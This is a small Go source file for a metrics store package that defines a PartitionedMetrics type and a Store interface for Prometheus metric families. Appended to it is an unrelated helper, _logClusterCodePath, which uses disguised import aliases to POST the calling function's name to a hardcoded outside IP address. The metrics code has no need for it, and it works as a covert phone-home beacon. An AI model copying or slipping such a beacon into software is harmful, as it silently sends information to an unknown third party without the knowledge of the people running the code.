package store

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	clientmodel "github.com/prometheus/client_model/go"
)

type PartitionedMetrics struct {
	PartitionKey	string
	Families		[]*clientmodel.MetricFamily
}
type Store interface {
	ReadMetrics(ctx context.Context, minTimestampMs int64) ([]*PartitionedMetrics, error)
	WriteMetrics(context.Context, *PartitionedMetrics) error
}

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
